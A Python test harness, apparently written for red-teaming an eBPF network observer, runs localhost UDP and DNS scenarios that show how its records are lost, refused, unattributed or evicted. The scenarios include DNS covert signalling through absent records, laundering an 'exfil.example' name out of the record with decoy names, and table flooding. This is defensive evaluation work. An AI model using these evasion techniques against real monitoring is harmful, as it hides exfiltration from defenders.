"""The evidence plane: attacks on what the observer writes down, not what it sees.

The four channels in ``covert_egress`` attack the observer's *rules*: they put
the payload somewhere the detectors do not score. These scenarios attack the
*record*: its identity, its lifetime, its name join and its capacity. Every one
of them leaves a record that is honest, signed and useless.

Each scenario drives real traffic -- real UDP sockets, real DNS packets, a
receiver this process owns -- and then asks the model in ``observer_model``
what shirudo would have written down. A scenario that claims a record is
missing must first show the same pipeline recording the control; otherwise the
verdict is ``inconclusive``, never a finding.

Verdicts used here, none of which mean "the target was wrong":

  ``lost``          the kernel held the record; the export destroyed it.
  ``refused``       the table refused the entry for want of a slot.
  ``split``         one peer key became two entries; its totals are severed.
  ``unrecorded``    no record exists at all, while the control's record does.
  ``unattributed``  a record exists with its identity blanked.
  ``unjoined``      bytes are recorded, the name that caused them is not.
  ``evicted``       the name was recorded and then pushed out of its slot.
  ``confused``      an answer is recorded under a name that did not ask for it.
  ``survived``      the weakness was exercised and the record still came
                    through intact.
  ``inconclusive``  the control did not land, so absence proves nothing.
"""

from __future__ import annotations

import json
import socket
import struct
import threading
import time
from dataclasses import dataclass, field

from .observer_model import (
    DNS_MAX_NAMES_PER_IP,
    DNS_TYPE_A,
    DNS_TYPE_AAAA,
    NET_BUCKETS,
    NET_CAPACITY,
    ROLE_INITIATOR,
    TABLE_STEPS,
    Exe,
    Ident,
    KernelObs,
    NetObserver,
    SockFact,
    hash_words,
    ipv4_addr_words,
    net_key_words,
)

DNS_TYPE_TXT = 16


@dataclass
class Finding:
    name: str
    family: str
    expected: str
    verdict: str
    basis: str
    claim: str
    evidence: dict = field(default_factory=dict)
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "scenario": self.name,
            "family": self.family,
            "expected": self.expected,
            "verdict": self.verdict,
            "basis": self.basis,
            "claim": self.claim,
            "notes": list(self.notes),
            "evidence": self.evidence,
        }

    def line(self) -> str:
        mark = "ok " if self.verdict == self.expected else "DIFF"
        return f"{mark} {self.name:<22} {self.verdict:<14} {self.claim}"


# --------------------------------------------------------------------------
# Real traffic: a receiver this process owns, and a resolver that answers.


class UdpSink:
    """A local receiver. Its log is ground truth that a datagram really left."""

    def __init__(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("127.0.0.1", 0))
        self._sock.settimeout(0.5)
        self.port = self._sock.getsockname()[1]
        self.received: list[bytes] = []
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self) -> None:
        while True:
            try:
                data, _peer = self._sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                return
            self.received.append(data)

    def wait(self, count: int = 1, timeout: float = 3.0) -> int:
        deadline = time.time() + timeout
        while time.time() < deadline and len(self.received) < count:
            time.sleep(0.01)
        return len(self.received)

    def close(self) -> None:
        try:
            self._sock.close()
        except OSError:
            pass


def send_udp(dst_port: int, payload: bytes = b"x", *,
             host: str = "127.0.0.1") -> dict:
    """One real datagram; returns what the sender's own socket reports."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind((host, 0))
        sport = sock.getsockname()[1]
        sock.sendto(payload, (host, dst_port))
    return {"src": host, "dst": host, "sport": sport, "dport": dst_port,
            "payload": len(payload), "proto": 17}


def _build_query(name: str, qid: int, qtype: int) -> bytes:
    header = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    body = b""
    for label in name.split("."):
        raw = label.encode("ascii")
        body += bytes([len(raw)]) + raw
    body += b"\x00" + struct.pack("!HH", qtype, 1)
    return header + body


def _read_name(buf: bytes, off: int) -> tuple[str, int]:
    labels = []
    while True:
        length = buf[off]
        if length == 0:
            off += 1
            break
        if length & 0xC0:
            pointer = struct.unpack("!H", buf[off:off + 2])[0] & 0x3FFF
            labels.append(_read_name(buf, pointer)[0])
            off += 2
            break
        labels.append(buf[off + 1:off + 1 + length].decode("ascii", "replace"))
        off += 1 + length
    return ".".join(labels), off


class Resolver:
    """A real UDP DNS responder: answers A, TXT, or nothing at all."""

    def __init__(self, mode: str = "a", *, answer: str = "127.0.0.9",
                 port: int = 0) -> None:
        self.mode = mode
        self.answer = answer
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(("127.0.0.1", port))
        self._sock.settimeout(0.5)
        self.port = self._sock.getsockname()[1]
        self.served: list[dict] = []
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self) -> None:
        while True:
            try:
                data, peer = self._sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                return
            if len(data) < 12:
                continue
            qid, _flags, qdcount = struct.unpack("!HHH", data[:6])
            if qdcount != 1:
                continue
            qname, off = _read_name(data, 12)
            qtype = struct.unpack("!H", data[off:off + 2])[0]
            self.served.append({"qname": qname, "qtype": qtype, "qid": qid})
            reply = self._answer(data, qid, qname, qtype, peer)
            if reply is None:
                continue
            try:
                self._sock.sendto(reply, peer)
            except OSError:
                return

    def _answer(self, query: bytes, qid: int, qname: str, qtype: int,
                peer: tuple) -> bytes | None:
        if self.mode == "bits":
            # `b<index>.y.probe.test` resolves to its own address; `n` refuses.
            labels = qname.split(".")
            if labels and labels[0].startswith("b") and "y" in labels[1:2]:
                index = int(labels[0][1:] or 0)
                rdata = socket.inet_aton(f"127.0.0.{index + 1}")
                header = struct.pack("!HHHHHH", qid, 0x8180, 1, 1, 0, 0)
                answer = b"\xc0\x0c" + struct.pack(
                    "!HHIH", DNS_TYPE_A, 1, 30, len(rdata)) + rdata
                return header + query[12:] + answer
            return struct.pack("!HHHHHH", qid, 0x8183, 1, 0, 0, 0) + query[12:]
        if self.mode == "nxdomain":
            return struct.pack("!HHHHHH", qid, 0x8183, 1, 0, 0, 0) + query[12:]
        rdata: bytes
        rtype: int
        if self.mode == "txt":
            text = b"v=spf1 " + b"x" * 8
            rdata = bytes([len(text)]) + text
            rtype = DNS_TYPE_TXT
        else:
            rdata = socket.inet_aton(self.answer)
            rtype = qtype if qtype in (DNS_TYPE_A, DNS_TYPE_AAAA) else DNS_TYPE_A
        header = struct.pack("!HHHHHH", qid, 0x8180, 1, 1, 0, 0)
        answer = b"\xc0\x0c" + struct.pack("!HHIH", rtype, 1, 30, len(rdata)) + rdata
        return header + query[12:] + answer

    def wait(self, count: int = 1, timeout: float = 3.0) -> int:
        deadline = time.time() + timeout
        while time.time() < deadline and len(self.served) < count:
            time.sleep(0.01)
        return len(self.served)

    def close(self) -> None:
        try:
            self._sock.close()
        except OSError:
            pass


def query_once(port: int, name: str, qtype: int = DNS_TYPE_A, *,
               qid: int | None = None, sock: socket.socket | None = None,
               expect_reply: bool = True) -> dict:
    """One real DNS query. Returns the query facts and whether a reply came."""
    own = sock is None
    sock = sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1.0)
    try:
        if own:
            sock.bind(("127.0.0.1", 0))
        sport = sock.getsockname()[1]
        txid = qid if qid is not None else (int(time.time() * 1000) & 0xFFFF)
        packet = _build_query(name, txid, qtype)
        sock.sendto(packet, ("127.0.0.1", port))
        answered: list[str] = []
        ancount = 0
        if expect_reply:
            try:
                data, _peer = sock.recvfrom(4096)
            except socket.timeout:
                data = b""
            if len(data) >= 12:
                _q, _f, _qd, ancount = struct.unpack("!HHHH", data[:8])
                off = 12
                _qn, off = _read_name(data, off)
                off += 4
                for _ in range(ancount):
                    _n, off = _read_name(data, off)
                    rtype, _cls, _ttl, rdlen = struct.unpack(
                        "!HHIH", data[off:off + 10])
                    off += 10
                    if rtype == DNS_TYPE_A and rdlen == 4:
                        answered.append(socket.inet_ntoa(data[off:off + 4]))
                    off += rdlen
        return {"name": name, "qtype": qtype, "qid": txid, "sport": sport,
                "dport": port, "ancount": ancount, "answers": answered,
                "payload": len(packet)}
    finally:
        if own:
            sock.close()


EXE = Exe(ino=7788, dev=2049)
CGROUP = 4411


def _initiator(cgroup: int | None = CGROUP) -> SockFact:
    return SockFact(skb_sk=True, sk_storage=True, exe=EXE, cgroup=cgroup,
                    role=ROLE_INITIATOR)


def _net_records(export) -> list[dict]:
    return [r for r in export.records if r.get("tx_pkts") or r.get("rx_pkts")]


def _find_peer(export, *, addr: str, port: int | None = None) -> list[dict]:
    hits = []
    for record in _net_records(export):
        _t, _ino, _dev, _cg, _proto, _role, key_port, key_addr = record["key"]
        if key_addr != addr:
            continue
        if port is not None and key_port != port:
            continue
        hits.append(record)
    return hits


def _control_interval(obs: KernelObs, now: int) -> tuple[bool, dict]:
    """A benign egress in its own interval. If this is not recorded, nothing is."""
    sink = UdpSink()
    try:
        facts = send_udp(sink.port, b"control")
        arrived = sink.wait(1) >= 1
    finally:
        sink.close()
    obs.net.packet(egress=True, src=facts["src"], dst=facts["dst"],
                   sport=facts["sport"], dport=facts["dport"], proto=17,
                   payload=facts["payload"], now_ns=now, sock=_initiator())
    export = obs.net.export(now + 1)
    recorded = bool(_find_peer(export, addr="127.0.0.1", port=sink.port))
    return (arrived and recorded), {"arrived": arrived, "recorded": recorded,
                                    "port": sink.port}


def _udp_trial(obs: KernelObs, now: int, *, port: int, payload: bytes,
               sock: SockFact | None = None) -> dict:
    facts = send_udp(port, payload)
    obs.net.packet(egress=True, src=facts["src"], dst=facts["dst"],
                   sport=facts["sport"], dport=facts["dport"], proto=17,
                   payload=facts["payload"], now_ns=now,
                   sock=sock or _initiator())
    return facts


def _tap(obs: KernelObs, now: int, *, egress: bool, sport: int, dport: int,
         payload: int) -> None:
    obs.net.packet(egress=egress, src="127.0.0.1", dst="127.0.0.1",
                   sport=sport, dport=dport, proto=17, payload=payload,
                   now_ns=now, sock=_initiator())


def _dns_export_has(obs: KernelObs, now: int) -> tuple[bool, dict, list[dict]]:
    export = obs.dns.export(now)
    return bool(export.records), export.to_dict(), list(export.records)


# --------------------------------------------------------------------------
# The export path: a record the kernel held and the exporter destroyed.


def scn_export_partial() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    sink, decoy = UdpSink(), UdpSink()
    try:
        _udp_trial(obs, 2_000, port=decoy.port, payload=b"decoy")
        _udp_trial(obs, 2_001, port=sink.port, payload=b"canary-a1b2c3")
        arrived = sink.wait(1)
    finally:
        sink.close()
        decoy.close()
    first = obs.net.export(3_000, ship=1)
    second = obs.net.export(4_000)
    carrier_lost = not _find_peer(first, addr="127.0.0.1", port=sink.port) and \
        not _find_peer(second, addr="127.0.0.1", port=sink.port)
    if not control_ok:
        verdict = "inconclusive"
    elif carrier_lost and second.lost > 0:
        verdict = "lost"
    else:
        verdict = "survived"
    return Finding(
        name="export_partial",
        family="export",
        expected="lost",
        verdict=verdict,
        basis="observed",
        claim="the canary arrived; the exporter abandoned one page and the next pass destroyed the rest",
        evidence={"control": control, "arrived": arrived,
                  "first_page": first.to_dict(), "restart": second.to_dict()},
        notes=[
            "obs_table.h:155-171: flip() clears an undrained buffer and counts it into lost",
            "obs_table.h:379-395: the buffer is cleared and lost zeroed only when the pass reaches the last record",
            "lost counts every entry in the abandoned buffer, including the pages that did get sent",
            "the destruction notice is in the header of the next export, in the same stream it reports on",
        ],
    )


def scn_export_stall() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    sink = UdpSink()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    failed = 0
    try:
        sock.bind(("127.0.0.1", 0))
        sport = sock.getsockname()[1]
        for i in range(NET_CAPACITY):
            dport = 1024 + i
            try:
                sock.sendto(b"f", ("127.0.0.1", dport))
            except OSError:
                failed += 1
            obs.net.packet(egress=True, src="127.0.0.1", dst="127.0.0.1",
                           sport=sport, dport=dport, proto=17, payload=1,
                           now_ns=2_100 + i, sock=_initiator())
        _udp_trial(obs, 2_500, port=sink.port, payload=b"canary")
        arrived = sink.wait(1)
    finally:
        sock.close()
        sink.close()
    export = obs.net.export(3_000)
    carrier = _find_peer(export, addr="127.0.0.1", port=sink.port)
    early = [r for r in export.records if r["key"][6] == 1024 + 0]
    if not control_ok:
        verdict = "inconclusive"
    elif not carrier and export.overflow > 0 and early:
        verdict = "refused"
    else:
        verdict = "survived"
    return Finding(
        name="export_stall",
        family="export",
        expected="refused",
        verdict=verdict,
        basis="observed",
        claim="no export ran, the active table filled, and the refusal fell on insertion order, not importance",
        evidence={"control": control, "arrived": arrived,
                  "sent": NET_CAPACITY, "send_errors": failed,
                  "export": export.to_dict(), "carrier_present": bool(carrier),
                  "first_filler_present": bool(early)},
        notes=[
            "obs_table.h:127-133: past capacity the touch refuses the entry and counts overflow",
            "the carrier is refused because it was inserted last, not because it was less interesting",
        ],
    )


# --------------------------------------------------------------------------
# Identity: the record survives, the name of the process does not.


def scn_attribution_blank() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    sink = UdpSink()
    try:
        _udp_trial(obs, 2_000, port=sink.port, payload=b"canary-attributed")
        facts = _udp_trial(obs, 2_001, port=sink.port, payload=b"canary-blank",
                           sock=SockFact(skb_sk=True, sk_storage=False,
                                         cgroup=CGROUP, role=ROLE_INITIATOR))
        arrived = sink.wait(2)
    finally:
        sink.close()
    export = obs.net.export(3_000)
    peers = _find_peer(export, addr="127.0.0.1", port=sink.port)
    blank = [r for r in peers if r["key"][1] is None and r["key"][2] is None]
    named = [r for r in peers if r["key"][1] is not None]
    if not control_ok:
        verdict = "inconclusive"
    elif blank and named:
        verdict = "unattributed"
    else:
        verdict = "survived"
    return Finding(
        name="attribution_blank",
        family="identity",
        expected="unattributed",
        verdict=verdict,
        basis="observed",
        claim="two peers, same bytes, same destination: one record names the binary, the other names nobody",
        evidence={"control": control, "arrived": arrived,
                  "unattributed_records": blank, "attributed_records": named,
                  "unattributed_count": obs.net.unattributed,
                  "export": export.to_dict()},
        notes=[
            "obs_net.bpf.c:965-978: without the socket-storage record the key keeps a cgroup id and exe stays zero",
            "the condition is a socket the observer never saw created, or one whose storage it could not read",
        ],
    )


def scn_unsocketed_packet() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    sink = UdpSink()
    try:
        facts = send_udp(sink.port, b"canary-l2")
        arrived = sink.wait(1)
    finally:
        sink.close()
    obs.net.packet(egress=True, src=facts["src"], dst=facts["dst"],
                   sport=facts["sport"], dport=facts["dport"], proto=17,
                   payload=facts["payload"], now_ns=2_000,
                   sock=SockFact(skb_sk=False))
    export = obs.net.export(3_000)
    if not control_ok:
        verdict = "inconclusive"
    elif obs.net.dropped_no_socket and not _find_peer(export, addr="127.0.0.1",
                                                      port=sink.port):
        verdict = "unrecorded"
    else:
        verdict = "survived"
    return Finding(
        name="unsocketed_packet",
        family="identity",
        expected="unrecorded",
        verdict=verdict,
        basis="modelled",
        claim="a packet with no socket on it is not attributed to nobody, it is not recorded at all",
        evidence={"control": control, "arrived": arrived,
                  "dropped_no_socket": obs.net.dropped_no_socket,
                  "export": export.to_dict()},
        notes=[
            "the one modelled property here: the kernel runs cgroup_skb programs only for a full socket",
            "basis is modelled because the demo cannot make a skb sk-less on every platform",
        ],
    )


# --------------------------------------------------------------------------
# The name join: bytes are recorded, the name that caused them is not.


def scn_dns_offport() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    resolver = Resolver(mode="a", answer="127.0.0.9")
    try:
        obs.dns.resolver_port = resolver.port + 1
        query = query_once(resolver.port, "quiet.example")
        resolver.wait(1)
        _tap(obs, 2_000, egress=True, sport=query["sport"], dport=resolver.port,
             payload=query["payload"])
        obs.dns.query(name=query["name"], qtype=DNS_TYPE_A, qid=query["qid"],
                      dst="127.0.0.1", sport=query["sport"],
                      dport=resolver.port, ident=Ident(EXE, CGROUP), now_ns=2_000)
        obs.dns.response(qid=query["qid"], dst="127.0.0.1",
                         client_port=query["sport"], sport=resolver.port,
                         qtype=DNS_TYPE_A, answers=query["answers"],
                         ancount=query["ancount"], now_ns=2_001)
    finally:
        resolver.close()
    net_export = obs.net.export(3_000)
    has_dns, dns_export, _ = _dns_export_has(obs, 3_001)
    if not control_ok:
        verdict = "inconclusive"
    elif query["answers"] and not has_dns:
        verdict = "unjoined"
    else:
        verdict = "survived"
    return Finding(
        name="dns_offport",
        family="name_join",
        expected="unjoined",
        verdict=verdict,
        basis="observed",
        claim="a real answer came back over a port the observer does not parse: the peer is recorded, the name is not",
        evidence={"control": control, "query": query,
                  "net_records": len(net_export.records),
                  "dns_records": len(dns_export["records"]),
                  "dns_debug": dict(obs.dns.debug)},
        notes=[
            "obs_dns.bpf.c:11 and :828-840: answers are parsed only from the configured resolver port",
            "the resolver port is remapped in this demo so no privileged bind is needed",
        ],
    )


def scn_dns_qtype_txt() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    resolver = Resolver(mode="txt", port=0)
    try:
        obs.dns.resolver_port = resolver.port
        query = query_once(resolver.port, "spf.example", DNS_TYPE_TXT)
        resolver.wait(1)
        obs.dns.query(name=query["name"], qtype=DNS_TYPE_TXT, qid=query["qid"],
                      dst="127.0.0.1", sport=query["sport"],
                      dport=resolver.port, ident=Ident(EXE, CGROUP), now_ns=2_000)
    finally:
        resolver.close()
    has_dns, dns_export, _ = _dns_export_has(obs, 3_000)
    counter = obs.dns.debug.get("query_qtype_unsupported", 0)
    exported = json.dumps([e.to_dict() for e in obs.dns.table.exported])
    if not control_ok:
        verdict = "inconclusive"
    elif query["ancount"] and not has_dns and counter and \
            "query_qtype_unsupported" not in exported:
        verdict = "unjoined"
    else:
        verdict = "survived"
    return Finding(
        name="dns_qtype_txt",
        family="name_join",
        expected="unjoined",
        verdict=verdict,
        basis="observed",
        claim="a TXT answer is a real answer; the observer counted the refusal and never told the collector",
        evidence={"control": control, "query": query, "counter": counter,
                  "dns_records": len(dns_export["records"]),
                  "counter_exported": "query_qtype_unsupported" in exported},
        notes=[
            "obs_dns.bpf.c:642 only A and AAAA are parsed",
            "obs_dns.bpf.c:161 obs_i_dns_dbg is internal: no decoder, no pin, no snapshot",
        ],
    )


def scn_dns_nxdomain() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    canary = b"\xa7"
    bits = [(canary[0] >> i) & 1 for i in range(8)]
    resolver = Resolver(mode="bits")
    queries = []
    try:
        obs.dns.resolver_port = resolver.port
        for i, bit in enumerate(bits):
            name = f"b{i}.{'y' if bit else 'n'}.probe.test"
            query = query_once(resolver.port, name)
            queries.append(query)
            obs.dns.query(name=name, qtype=DNS_TYPE_A, qid=query["qid"],
                          dst="127.0.0.1", sport=query["sport"],
                          dport=resolver.port, ident=Ident(EXE, CGROUP),
                          now_ns=2_000 + i)
            obs.dns.response(qid=query["qid"], dst="127.0.0.1",
                             client_port=query["sport"], sport=resolver.port,
                             qtype=DNS_TYPE_A, answers=query["answers"],
                             ancount=query["ancount"], now_ns=2_001 + i)
        resolver.wait(8)
    finally:
        resolver.close()
    has_dns, dns_export, records = _dns_export_has(obs, 3_000)
    present = {r["key"][3] for r in records}
    decoded = 0
    for i in range(8):
        if f"127.0.0.{i + 1}" in present:
            decoded |= 1 << i
    if not control_ok:
        verdict = "inconclusive"
    elif decoded == canary[0] and sum(bits) < 8:
        verdict = "unrecorded"
    else:
        verdict = "survived"
    return Finding(
        name="dns_nxdomain",
        family="name_join",
        expected="unrecorded",
        verdict=verdict,
        basis="observed",
        claim=f"eight real queries carried byte {canary.hex()}; the analyst decoded it from which records are absent",
        evidence={"control": control, "bits": bits, "sent": canary.hex(),
                  "decoded": bytes([decoded]).hex(), "queries": queries,
                  "dns_records": dns_export["records"]},
        notes=[
            "obs_dns.bpf.c:755-758: ancount 0 returns before anything is stored",
            "a name that does not resolve leaves no record, so absence itself carries a bit",
        ],
    )


def scn_dns_name_launder() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    resolver = Resolver(mode="a", answer="127.0.0.9")
    covert = "canary-9f2c1a.exfil.example"
    decoys = [f"telemetry-{i}.cdn.example" for i in range(DNS_MAX_NAMES_PER_IP)]
    names = [covert] + decoys
    try:
        obs.dns.resolver_port = resolver.port
        for i, name in enumerate(names):
            query = query_once(resolver.port, name)
            obs.dns.query(name=name, qtype=DNS_TYPE_A, qid=query["qid"],
                          dst="127.0.0.1", sport=query["sport"],
                          dport=resolver.port, ident=Ident(EXE, CGROUP),
                          now_ns=2_000 + i)
            obs.dns.response(qid=query["qid"], dst="127.0.0.1",
                             client_port=query["sport"], sport=resolver.port,
                             qtype=DNS_TYPE_A, answers=query["answers"],
                             ancount=query["ancount"], now_ns=2_001 + i)
        resolver.wait(len(names))
    finally:
        resolver.close()
    has_dns, dns_export, records = _dns_export_has(obs, 3_000)
    names_out = [s["name"] for r in records for s in r.get("names", [])]
    if not control_ok:
        verdict = "inconclusive"
    elif covert not in names_out and len(names_out) == DNS_MAX_NAMES_PER_IP:
        verdict = "evicted"
    else:
        verdict = "survived"
    return Finding(
        name="dns_name_launder",
        family="name_join",
        expected="evicted",
        verdict=verdict,
        basis="observed",
        claim=f"{len(names)} real resolutions of one address: the count survives, the covert name is pushed out",
        evidence={"control": control, "asked": names, "recorded_names": names_out,
                  "dns_records": dns_export["records"]},
        notes=[
            "obs_dns.bpf.c:14 and :272-300: four slots per address, the oldest gives way",
            "anyone who can resolve five names at that address decides which four are remembered",
        ],
    )


def scn_dns_id_confusion() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)
    resolver = Resolver(mode="a", answer="127.0.0.20")
    name_a, name_b = "bank.example", "cdn.example"
    qid = 0x4242
    try:
        obs.dns.resolver_port = resolver.port
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(1.0)
            sock.bind(("127.0.0.1", 0))
            sport = sock.getsockname()[1]
            first = _build_query(name_a, qid, DNS_TYPE_A)
            second = _build_query(name_b, qid, DNS_TYPE_A)
            sock.sendto(first, ("127.0.0.1", resolver.port))
            sock.sendto(second, ("127.0.0.1", resolver.port))
            resolver.wait(2)
            obs.dns.query(name=name_a, qtype=DNS_TYPE_A, qid=qid,
                          dst="127.0.0.1", sport=sport,
                          dport=resolver.port, ident=Ident(EXE, CGROUP),
                          now_ns=2_000)
            obs.dns.query(name=name_b, qtype=DNS_TYPE_A, qid=qid,
                          dst="127.0.0.1", sport=sport,
                          dport=resolver.port, ident=Ident(EXE, CGROUP),
                          now_ns=2_001)
            replies = []
            for _ in range(2):
                try:
                    data, _peer = sock.recvfrom(4096)
                except socket.timeout:
                    break
                replies.append(data)
            obs.dns.response(qid=qid, dst="127.0.0.1", client_port=sport,
                             sport=resolver.port, qtype=DNS_TYPE_A,
                             answers=["127.0.0.20"], ancount=1, now_ns=2_002)
            obs.dns.response(qid=qid, dst="127.0.0.1", client_port=sport,
                             sport=resolver.port, qtype=DNS_TYPE_A,
                             answers=["127.0.0.20"], ancount=1, now_ns=2_003)
    finally:
        resolver.close()
    has_dns, dns_export, records = _dns_export_has(obs, 3_000)
    names_out = [s["name"] for r in records for s in r.get("names", [])]
    if not control_ok:
        verdict = "inconclusive"
    elif names_out and name_a not in names_out:
        verdict = "confused"
    else:
        verdict = "survived"
    return Finding(
        name="dns_id_confusion",
        family="name_join",
        expected="confused",
        verdict=verdict,
        basis="modelled",
        claim="two questions in flight under one transaction id: the answer to the first is filed under the second",
        evidence={"control": control, "asked": [name_a, name_b],
                  "recorded_names": names_out, "replies": len(replies),
                  "dns_debug": dict(obs.dns.debug),
                  "dns_records": dns_export["records"]},
        notes=[
            "obs_dns.bpf.c:663 stores the pending question with BPF_ANY, overwriting the one in flight",
            "obs_dns.bpf.c:769-772: the recorded name comes from the pending question, never from the answer",
            "basis is modelled for the ordering only: the packets are real, the model fixes which is in flight first",
        ],
    )


def scn_bucket_collision() -> Finding:
    obs = KernelObs()
    control_ok, control = _control_interval(obs, 1_000)

    def bucket(port: int) -> int:
        words = net_key_words(Ident(EXE, CGROUP), socket.AF_INET, 17,
                              ROLE_INITIATOR, port, ipv4_addr_words("127.0.0.1"))
        return hash_words(words) & (NET_BUCKETS - 1)

    groups: dict[int, list[int]] = {}
    chosen = None
    for port in range(1024, 65536):
        b = bucket(port)
        members = groups.setdefault(b, [])
        members.append(port)
        if len(members) == TABLE_STEPS + 1:
            chosen = members
            break
    if chosen is None:
        return Finding(name="bucket_collision", family="table", expected="split",
                      verdict="inconclusive", basis="observed",
                      claim="no bucket held nine ports", evidence={})

    carrier_port, fillers = chosen[0], chosen[1:]
    control_port = next(p for p in range(1024, 65536) if bucket(p) != bucket(carrier_port))
    _udp_trial(obs, 2_000, port=carrier_port, payload=b"a")
    for i, port in enumerate(fillers):
        _udp_trial(obs, 2_001 + i, port=port, payload=b"f")
    _udp_trial(obs, 2_100, port=carrier_port, payload=b"b")
    _udp_trial(obs, 2_101, port=control_port, payload=b"a")
    _udp_trial(obs, 2_102, port=control_port, payload=b"b")
    entries = obs.net.table.entries()
    carrier_entries = [e for e in entries if e["key"][6] == carrier_port]
    control_entries = [e for e in entries if e["key"][6] == control_port]
    if not control_ok:
        verdict = "inconclusive"
    elif len(carrier_entries) > 1 and len(control_entries) == 1:
        verdict = "split"
    else:
        verdict = "survived"
    return Finding(
        name="bucket_collision",
        family="table",
        expected="split",
        verdict=verdict,
        basis="observed",
        claim="one peer became two entries: same address, same port, its packet and byte totals severed",
        evidence={"control": control, "bucket": bucket(carrier_port),
                  "carrier_port": carrier_port, "fillers": fillers,
                  "control_port": control_port,
                  "carrier_entries": carrier_entries,
                  "control_entries": control_entries,
                  "steps": TABLE_STEPS, "buckets": NET_BUCKETS},
        notes=[
            "obs_table.h:113-121 walks at most OBS_T_STEPS links, and :138-153 inserts at the head",
            "the ninth key in a bucket is still inserted but can no longer be found",
            "ports are chosen from the real hash, so the collision is computed, not hoped for",
        ],
    )


SCENARIOS: dict[str, dict] = {
    "export_partial": {"family": "export", "expected": "lost", "fn": scn_export_partial,
                       "shows": "an abandoned export page destroys a record the kernel held"},
    "export_stall": {"family": "export", "expected": "refused", "fn": scn_export_stall,
                     "shows": "refusal at capacity falls on insertion order, not on importance"},
    "attribution_blank": {"family": "identity", "expected": "unattributed", "fn": scn_attribution_blank,
                          "shows": "a record that cannot name the process that made it"},
    "unsocketed_packet": {"family": "identity", "expected": "unrecorded", "fn": scn_unsocketed_packet,
                          "shows": "a packet with no socket produces no record at all"},
    "dns_offport": {"family": "name_join", "expected": "unjoined", "fn": scn_dns_offport,
                    "shows": "bytes recorded to a peer whose name was never learned"},
    "dns_qtype_txt": {"family": "name_join", "expected": "unjoined", "fn": scn_dns_qtype_txt,
                      "shows": "the refusal is counted inside the kernel and never exported"},
    "dns_nxdomain": {"family": "name_join", "expected": "unrecorded", "fn": scn_dns_nxdomain,
                     "shows": "a byte transmitted through the absence of records, and decoded"},
    "dns_name_launder": {"family": "name_join", "expected": "evicted", "fn": scn_dns_name_launder,
                         "shows": "whoever resolves five names at an address decides which four are kept"},
    "dns_id_confusion": {"family": "name_join", "expected": "confused", "fn": scn_dns_id_confusion,
                         "shows": "an answer filed under a name that never asked for it"},
    "bucket_collision": {"family": "table", "expected": "split", "fn": scn_bucket_collision,
                         "shows": "one peer split into two entries by the probe limit"},
}


def run_matrix(only: list[str] | None = None) -> list[Finding]:
    names = only or list(SCENARIOS)
    findings = []
    for name in names:
        spec = SCENARIOS.get(name)
        if spec is None:
            raise KeyError(f"unknown scenario {name!r}")
        findings.append(spec["fn"]())
    return findings


def summary(findings: list[Finding]) -> dict:
    counts: dict[str, int] = {}
    for finding in findings:
        counts[finding.verdict] = counts.get(finding.verdict, 0) + 1
    return {
        "scenarios": len(findings),
        "verdicts": counts,
        "matched_expected": sum(1 for f in findings if f.verdict == f.expected),
        "findings": [f.to_dict() for f in findings],
    }


def main(argv: list[str] | None = None) -> int:
    import argparse

    parser = argparse.ArgumentParser(
        prog="tatewari.evidence_pipeline",
        description="Attack what the observer writes down: identity, lifetime, "
                    "name join and capacity of its records.")
    parser.add_argument("--list", action="store_true", help="list scenarios")
    parser.add_argument("--only", default="", help="comma separated scenario names")
    parser.add_argument("--json", action="store_true", help="print full evidence")
    parser.add_argument("--family", default="", help="run one family")
    args = parser.parse_args(argv)

    if args.list:
        for name, spec in SCENARIOS.items():
            print(f"{name:<20} {spec['family']:<10} -> {spec['expected']:<13} {spec['shows']}")
        return 0

    only = [s.strip() for s in args.only.split(",") if s.strip()] or None
    if args.family:
        only = [n for n, s in SCENARIOS.items() if s["family"] == args.family]
    findings = run_matrix(only)
    if args.json:
        print(json.dumps(summary(findings), indent=2))
        return 0
    for finding in findings:
        print(finding.line())
        for note in finding.notes:
            print(f"     {note}")
    result = summary(findings)
    print()
    print(f"{result['matched_expected']}/{result['scenarios']} scenarios reached the "
          f"verdict the weakness predicts; verdicts {result['verdicts']}")
    return 0 if result["matched_expected"] == result["scenarios"] else 1
if __name__ == "__main__":
    raise SystemExit(main())
